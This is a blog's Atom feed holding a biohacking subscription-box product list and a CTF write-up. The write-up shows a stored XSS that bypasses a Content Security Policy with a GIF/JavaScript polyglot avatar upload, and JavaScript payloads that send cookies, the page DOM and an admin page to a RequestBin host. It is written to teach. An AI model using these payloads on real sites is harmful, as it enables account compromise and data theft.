<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.1.6">Jekyll</generator><link href="http://devalias.net//feed.xml" rel="self" type="application/atom+xml" /><link href="http://devalias.net//" rel="alternate" type="text/html" /><updated>2016-10-14T15:32:13+11:00</updated><id>http://devalias.net//</id><title>/dev/alias â€“ Hack. Dev. Transcend.</title><subtitle>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.
</subtitle><entry><title>Bulletproof Biohacking Box #8</title><link href="http://devalias.net//devalias/2016/10/13/bulletproof-biohacking-box-8/" rel="alternate" type="text/html" title="Bulletproof Biohacking Box #8" /><published>2016-10-13T00:00:00+11:00</published><updated>2016-10-13T00:00:00+11:00</updated><id>http://devalias.net//devalias/2016/10/13/bulletproof-biohacking-box-8</id><content type="html" xml:base="http://devalias.net//devalias/2016/10/13/bulletproof-biohacking-box-8/">&lt;p&gt;So it&amp;#39;s that time again where biohacking christmas comes early (4 times a year!) Before I get into the content from this box, it seems Dave and the team have decided to move on from &lt;a href=&quot;https://quarterly.co/&quot;&gt;Quarterly&lt;/a&gt; and give the biohacking box a new home on &lt;a href=&quot;http://biohacked.com/&quot;&gt;biohacked.com&lt;/a&gt;. So if you want to find it, make sure you head over there and sign up!&lt;/p&gt;

&lt;p&gt;Without further ado, the contents!&lt;/p&gt;

&lt;h2&gt;BIO08&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO08&quot;&gt;BIO08 Unboxing Video&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;0:45 Total box value: ~US$287&lt;/li&gt;
&lt;li&gt;1:04 &lt;a href=&quot;https://alituranaturals.com/product/alitura-night-cream/&quot;&gt;Alitura Night Cream&lt;/a&gt; (US$79)

&lt;ul&gt;
&lt;li&gt;20% discount code: BP20&lt;/li&gt;
&lt;li&gt;Jar should last about a month.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;5:01 &lt;a href=&quot;http://www.swanwicksleep.com/products/swannies-blue-light-blocking-glasses&quot;&gt;Swannies Blue Blocking Glasses&lt;/a&gt; (~US$89-134)

&lt;ul&gt;
&lt;li&gt;40% discount code: BULLETPROOF&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;8:52 &lt;a href=&quot;http://bedtimebliss.org/products/btbt&quot;&gt;Bedtime Bliss Organic Bamboo Sleep Mask&lt;/a&gt; ($US17.50)

&lt;ul&gt;
&lt;li&gt;Contoured so it doesn&amp;#39;t press on your eyes/eyelashes during REM sleep.&lt;/li&gt;
&lt;li&gt;Been using this for the past few nights and it&amp;#39;s been awesome! I haven&amp;#39;t managed to black out my room yet since moving recently. Using this has shown a dramatic increase in deeper sleep on my sleep tracking, and generally just feeling more rested with it.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;10:38 &lt;a href=&quot;http://www.bluestarcoloring.com/our-books/&quot;&gt;Blue Star &amp;#39;Form&amp;#39; Coloring Book&lt;/a&gt; ($US18)

&lt;ul&gt;
&lt;li&gt;Increases HRV, drops you into a calmer alpha state.&lt;/li&gt;
&lt;li&gt;30% discount on their &lt;a href=&quot;http://bluestarinspire.com/bulletproof&quot;&gt;digital subscription service: Inspire&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;14:15 Colored Pencils

&lt;ul&gt;
&lt;li&gt;With Bulletproof logo! :p&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;15:06 &lt;a href=&quot;https://fatwater.com/home&quot;&gt;FATwater - a whole case&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;16:57 Golden Ticket: &lt;a href=&quot;http://www.thync.com/&quot;&gt;Thync&lt;/a&gt; (US$199)

&lt;ul&gt;
&lt;li&gt;Form of tDCS for energy/calm&lt;/li&gt;
&lt;li&gt;$20 off: SHFVIBE (till 24/11/16)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;21:00 Golden Ticket: &lt;a href=&quot;http://bulletproofconference.com&quot;&gt;2016 Bulletproof Conference Pass (incl +1)&lt;/a&gt; (US$1500)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>devalias</name></author><category term="quicknote" /><category term="bulletproof" /><category term="bulletproof-quarterly" /><category term="dave-asprey" /><category term="quarterly" /><category term="biohacking" /><summary>So it&amp;#39;s that time again where biohacking christmas comes early (4 times a year!) Before I get into the content from this box, it seems Dave and the team have decided to move on from Quarterly and give the biohacking box a new home on biohacked.com. So if you want to find it, make sure you head over there and sign up!</summary></entry><entry><title>CTF Snippets: XSS.gif</title><link href="http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif/" rel="alternate" type="text/html" title="CTF Snippets: XSS.gif" /><published>2016-09-16T00:00:00+10:00</published><updated>2016-09-16T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif</id><content type="html" xml:base="http://devalias.net//devalias/2016/09/16/ctf-snippets-xss-gif/">&lt;p&gt;I was playing around with the top challenge on the CTF at &lt;a href=&quot;http://www.sectalks.org/canberra/&quot;&gt;SecTalks&lt;/a&gt; the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.&lt;/p&gt;

&lt;h2&gt;Hack the gibso.. Website&lt;/h2&gt;

&lt;p&gt;To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the &lt;code&gt;administrator&lt;/code&gt; was online.. interesting.&lt;/p&gt;

&lt;p&gt;Poking around at things, I discovered that the messaging system didn&amp;#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;XSS&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I checked the message.. but for some reason it didn&amp;#39;t pop, even though my payload seemed fine in the source. :(&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;well&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;XSS&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Looking at the developer console gave me some more insight. Apparently this site had &lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot;&gt;Content Security Policy&lt;/a&gt; enabled, and it was blocking my payload.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Refused to execute inline script because it violates the following Content Security Policy directive: &amp;quot;script-src &amp;#39;self&amp;#39;&amp;quot;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;Content-Security-Policy:
  default-src &#39;none&#39;;
  img-src &#39;self&#39; placehold.it *.imgix.net;
  script-src &#39;self&#39;;
  connect-src &#39;self&#39;;
  style-src &#39;self&#39; fonts.gstatic.com fonts.googleapis.com;
  font-src &#39;self&#39; fonts.googleapis.com fonts.gstatic.com;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from &lt;code&gt;self&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.&lt;/p&gt;

&lt;p&gt;Using the &lt;code&gt;GIF89a&lt;/code&gt; format (which conveniently starts with it&amp;#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &amp;#39;avatar&amp;#39; &lt;code&gt;pwn.gif&lt;/code&gt;, designed to steal cookies via &lt;a href=&quot;http://requestb.in/&quot;&gt;RequestBin&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://requestb.in/secretcode?c=&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &amp;#39;avatar&amp;#39; by sending myself a test message:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://example.com/uploads/filenamehash.gif&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Refused to execute script from &amp;#39;&lt;a href=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;http://example.com/uploads/filenamehash.gif&lt;/a&gt;&amp;#39; because its MIME type (&amp;#39;image/gif&amp;#39;) is not executable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that &lt;code&gt;HttpOnly&lt;/code&gt; flag first.. Sometimes I just get caught up in the heat of the moment.&lt;/p&gt;

&lt;p&gt;Ok.. so we couldn&amp;#39;t steal the cookies.. but what could we do? &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot;&gt;Cross-Site Request Forgery (CSRF)&lt;/a&gt; maybe? There was a CSRF token designed to prevent this, but it didn&amp;#39;t seem to get validated. That&amp;#39;s good.. but what should we target?&lt;/p&gt;

&lt;p&gt;Needing some better visibility on the situation, I decided to just steal the whole &lt;a href=&quot;https://en.wikipedia.org/wiki/Document_Object_Model&quot;&gt;DOM&lt;/a&gt; and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;form&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;textarea&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Capture the entire DOM and Base64 encode it */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Inject the form and send it */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ignoring my rusty JavsScript, the new payload would create a HTML &lt;code&gt;form&lt;/code&gt; element with a &lt;code&gt;textarea&lt;/code&gt;, grab the entire contents of the DOM, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa&quot;&gt;Base64 encode&lt;/a&gt; them, stick them in the &lt;code&gt;textarea&lt;/code&gt;, inject the &lt;code&gt;form&lt;/code&gt; into the page, then send that off to RequestBin.&lt;/p&gt;

&lt;p&gt;After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sweet, let&amp;#39;s find something juicy on that page! Reworking the payload (with a little help from &lt;a href=&quot;https://api.jquery.com/jquery.get/&quot;&gt;JQuery&lt;/a&gt; that was already on the site):&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;form&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;textarea&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Inject the form */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Load the admin page ajax-style, Base64 encode it, send it off */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using the last payload as the template, I updated it to load the &lt;code&gt;admin.php&lt;/code&gt; page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&amp;#39;t even a need to do anything else:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;legend&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/legend&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;flag{the-secret-flag-code}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mischief managed!&lt;/p&gt;

&lt;h2&gt;Raw Notes&lt;/h2&gt;

&lt;p&gt;I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Administrator is online&lt;/li&gt;
